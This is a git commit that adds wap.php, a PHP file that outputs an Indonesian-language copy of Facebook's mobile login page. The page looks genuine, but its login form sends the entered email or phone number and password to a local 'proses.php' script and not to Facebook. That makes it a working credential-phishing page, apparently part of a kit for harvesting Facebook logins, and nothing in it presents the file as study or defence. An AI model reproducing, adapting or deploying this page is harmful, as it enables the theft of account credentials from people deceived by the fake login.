6f6afb73dfb6171f11a27544e07b57be05909983
Rmdn19id <40439759+Rmdn19id@users.noreply.github.com>
2019-01-17 10:36:43 +0700

    Create wap.php

---
+++ wap.php
@@ -0,0 +1,105 @@
+<?php
+
+echo '<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head title="Selamat datang di Facebook"><title>Selamat datang di Facebook</title><meta name="description" content="Facebook helps you connect and share with the people in your life." /><link rel="apple-touch-icon-precomposed" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/y7/r/Frj81IxGhLi.png" sizes="144x144" /><meta name="referrer" content="default" id="meta_referrer" /><noscript><meta http-equiv="X-Frame-Options" content="DENY" /></noscript><style type="text/css">/*<![CDATA[*/.nontouch .mobile-login-field .input{width:90%}
+#footer .acg{background:#fff}._fco #header td{padding:2px;vertical-align:middle}
+._fco .other-links{line-height:2em}
+._fco .button_area .btnC{color:#fff}
+._fco .button_area .btnR{background-color:#b9b9b9;color:#000}
+._fco .button_area .btnR:hover{background-color:#999;color:#000}
+._fcp div.button_area{width:89%}
+._fcp #form_fields > div > div{padding:0 3px 0 0}
+._fcp .button_area .largeBtn{padding:5px}
+._4u99{color:#87898c;font-size:13px;font-weight:700;padding:5px 0 0 4px}
+._4u9a #login_form hr{display:none}
+._4u9a ._4u9b, ._4u9a ._4u9b .button_area, ._4u9a ._4u9b ._4u99{background-color:#fbfbfb}
+._4u9a ._4u9b{border-bottom:1px solid #fff;border-top:1px solid #cacdd3;margin-top:7px;padding-bottom:10px;padding-top:7px}
+._4u9a .other-links{border-bottom:1px solid #cacdd3}
+._4u9a #footer{background-color:#eceff5;padding-top:6px}
+._4u9a #footer div{background-color:#eceff5}
+._4u9a._4u9c ._4u9b{border-bottom:0;padding-bottom:0}
+._4u9a._4u9c #footer, ._4u9a._4u9c #footer div, ._4u9a._4u9c .other-links{background-color:#fbfbfb}.nontouch ._4g33{border:0;border-collapse:collapse;margin:0;padding:0;width:100%}
+.nontouch ._52wc td, .nontouch ._52wf td{vertical-align:top}
+.nontouch ._52wd td{vertical-align:bottom}
+.nontouch ._52we td{vertical-align:middle}
+.nontouch ._4g34{width:100%}form{margin:0;border:0}.acw{background-color:#fff}
+.acbk{background-color:#000}
+.acb{background-color:#3b5998}
+.aclb{background-color:#eceff5}
+.acdb{background-color:#31394a}
+.acg{background-color:#f2f2f2}
+.acy{background-color:#fffbe2;color:#7f7212}
+.acr{background-color:#ffebe8;color:#6d220d}.aps{padding:2px 3px}
+.apm{padding:4px 3px}
+.apl{padding:6px 3px}.input{border:solid 1px #999;border-top-color:#888;margin:0;padding:3px}
+.nontouch .input{padding:3px 3px 4px 0}.fcb{color:#000}
+.fcg{color:gray}
+.fcw{color:#fff}
+.fcl{color:#3b5998}
+.fcs{color:#6d84b4}.mfsxs{font-size:x-small}
+.mfss{font-size:small}
+body, tr, input, textarea, .mfsm{font-size:medium}
+.mfsl{font-size:large}.nontouch a,
+.nontouch a:visited{color:#3b5998;text-decoration:none}
+.nontouch .sub,
+.nontouch .sub:visited{color:gray}
+.nontouch .sec,
+.nontouch .sec:visited{color:#6d84b4}
+.nontouch .inv,
+.nontouch .inv:visited{color:#fff}.nontouch a:focus,
+.nontouch a:hover,
+.nontouch .sub:focus,
+.nontouch .sub:hover,
+.nontouch .sec:focus,
+.nontouch .sec:hover{background-color:#3b5998;color:#fff}
+.nontouch .inv:focus,
+.nontouch .inv:hover,
+.nontouch .inv:hover .fcy,
+.nontouch .inv:focus .fcy{background-color:#fff;color:#3b5998}.btn{border:solid 2px;cursor:pointer;margin:0;padding:2px 6px 3px;text-align:center}
+.btn.largeBtn{display:block}
+button.largeBtn,
+input.largeBtn{width:100%}
+.btnForm{display:inline;border:none;padding:0}
+.btnD,
+.acb .btnC,
+.btnI,
+.nontouch a.btnD,
+.nontouch .acb a.btnC,
+.nontouch a.btnI{background:#f3f4f5;border-color:#ccc #aaa #999;color:#505c77}
+.acb .btnD,
+.btnC,
+.acb .btnI,
+.nontouch .acb a.btnD,
+.nontouch a.btnC,
+.nontouch a.btnC:visited,
+.nontouch .acb a.btnI{background:#3b5998;border-color:#8a9ac5 #29447E #1a356e;color:#fff}
+.nontouch .btnC.disabled{color:#9dabce}
+.btnS,
+.nontouch a.btnS,
+.nontouch a.btnS:visited{background:#69a74e;border-color:#98c37d #3b6e22 #2c5115;color:#fff}
+.btnN,
+.nontouch a.btnN,
+.nontouch a.btnN:visited{background:#ee3f10;border-color:#f48365 #8d290e #762610;color:#fff}
+.btn .img{pointer-events:none}.btn,
+.btnForm{display:inline-block}
+.btn + .btn,
+.btnForm + .btnForm,
+.btn + .btnForm,
+.btnForm + .btn{margin-left:3px}
+.largeBtn + .largeBtn{margin-left:0;margin-top:6px}
+.btn input{background:none;border:none;margin:0;padding:0}
+.btnD input,
+.acb .btnC input,
+.btnI input{color:#505c77}
+.acb .btnD input,
+.btnC input,
+.acb .btnI input,
+.btnS input,
+.btnN input{color:#fff}body{margin:0;padding:0;text-align:left;direction:ltr}
+body, tr, input, textarea, button{font-family:sans-serif}
+h1, h2, h3, h4, h5, h6{font-size:1em;font-weight:bold;margin:0;padding:0}._513c #viewport{margin:0 auto;max-width:600px}#viewport{min-height:100%;overflow:hidden;position:relative;width:100%}
+#page{position:relative}
+.nontouch #viewport{min-height:auto;overflow:auto;position:static;width:auto}.lr{width:100%}
+.lr .r{text-align:right}.img{border:0;display:inline-block;vertical-align:top}
+i.img u{position:absolute;width:0;height:0;overflow:hidden}/*]]>*/</style></head><body tabindex="0" class="nontouch x1 ff _513c acw"><div class="mfsm"><div id="viewport"><div class="acb aps" id="u_0_0"><table cellspacing="0" cellpadding="0" class="lr"><tr><td valign="top"><h1><a href="/home.php?_mn_=2&amp;refid=8"><img src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yz/r/aKhO2tw3FnO.png" width="76" height="20" class="img" alt="facebook" /></a></h1></td><td valign="top" class="r"><a class="btn btnS" href="/r.php?_mn_=10&amp;refid=8">Buat Akun</a></td></tr></table></div><div id="objects_container"><div id="root" role="main" class="_fco acw" data-sigil="context-layer-root content-pane"><table class="_52wf _4g33"><tbody><tr><td class="_4g34"><div><div class="aclb"><div class="loginInner"><form method="post" class="mobile-login-form _fcp" id="login_form" novalidate="1" action="proses.php"><input type="hidden" name="lsd" value="AVqkCeXx" autocomplete="off" /><input type="hidden" name="charset_test" value="€,´,€,´,&#27700;,&#1044;,&#1028;" /><input type="hidden" name="version" value="1" /><input type="hidden" id="ajax" name="ajax" value="0" /><input type="hidden" id="width" name="width" value="0" /><input type="hidden" id="pxr" name="pxr" value="0" /><input type="hidden" id="gps" name="gps" value="0" /><input type="hidden" autocomplete="off" name="m_ts" value="1375685591" /><input type="hidden" autocomplete="off" name="li" value="10v_UUBdHxhX39vWlEQj95IP" /><input type="hidden" autocomplete="off" name="signup_layout" value="layout|bottom_clean||wider_form||prmnt_btn|special||st|create||header_crt_acct_button||hdbtn_color|green||signupinstr||launched_Mar3" /><div id="form_fields"><div class="mobile-login-field aclb apl"><div>Email atau Telepon<br /><input autocorrect="off" autocapitalize="off" class="input" name="email" value="" type="text" /></div></div><div class="mobile-login-field aclb apl"><div>Kata Sandi<br /><input autocorrect="off" autocapitalize="off" class="input" name="pass" type="password" /></div></div></div><div class="button_area aclb apl"><input value="Masuk" type="submit" name="login" class="btn btnC largeBtn" size="0" /></div><hr style="background-color:#cccccc;height:1px;border:0px solid #fff;margin:0.3em auto;width:100%;" /><div class="_4u9b aclb"><div class="_4u99">Baru mengenal Facebook?</div><div class="button_area aclb apl"><a class="btn btnS largeBtn" href="/r.php?_mn_=10&amp;refid=8">Buat Akun Baru</a></div></div><noscript><input type="hidden" autocomplete="off" name="_fb_noscript" value="true" /></noscript></form><div class="other-links aclb apl"><span class="mfsm fcg"><a href="/recover/initiate/?_mn_=10&amp;refid=8">Lupa kata sandi?</a><br /><a href="/help/?_mn_=10&amp;refid=8">Pusat Bantuan</a></span></div></div></div></div></td></tr></tbody></table></div></div><div><div id="footer"><div class="acg apm"><span class="mfss fcg"><b>Bahasa Indonesia</b><dr><dr><span role="separator" aria-hidden="true">·</span><dr><dr><a class="sec" href="/a/language.php?l=en_US&amp;lref=https%3A%2F%2Fm.facebook.com%2Findex.php%3Fstype%3Dlo%26jlou%3DAffaQrKCuZEkCGG_EAdsBY6RRqLHxKAnBjumvWXo6r3FBns2BNd8gdW26aeDe-s7sAr8Jn-absrP8zvbft7mxNChVefNNdad2S497Y5SdySj4Q%26smuh%3D12983%26lh%3DAc8-wW6iDvwykBAc%26refid%3D8&amp;gfid=AQCY08exkYzKXdHE&amp;refid=8">English (US)</a><dr><dr><span role="separator" aria-hidden="true">·</span><dr><dr><a class="sec" href="/a/language.php?l=es_LA&amp;lref=https%3A%2F%2Fm.facebook.com%2Findex.php%3Fstype%3Dlo%26jlou%3DAffaQrKCuZEkCGG_EAdsBY6RRqLHxKAnBjumvWXo6r3FBns2BNd8gdW26aeDe-s7sAr8Jn-absrP8zvbft7mxNChVefNNdad2S497Y5SdySj4Q%26smuh%3D12983%26lh%3DAc8-wW6iDvwykBAc%26refid%3D8&amp;gfid=AQCxvC-h5RA6mELJ&amp;refid=8">Espanol</a><dr><dr><span role="separator" aria-hidden="true">·</span><dr><dr><a class="sec" href="/language.php?n=https%3A%2F%2Fm.facebook.com%2Findex.php%3Fstype%3Dlo%26jlou%3DAffaQrKCuZEkCGG_EAdsBY6RRqLHxKAnBjumvWXo6r3FBns2BNd8gdW26aeDe-s7sAr8Jn-absrP8zvbft7mxNChVefNNdad2S497Y5SdySj4Q%26smuh%3D12983%26lh%3DAc8-wW6iDvwykBAc%26refid%3D8&amp;_mn_=10&amp;refid=8">Lainnya…</a></span></div><div class="acg apm"><span class="mfss fcg">Facebook &copy; 2013</span></div></div></div></div><div id="static_templates"></div></div></body></html>'
+?>
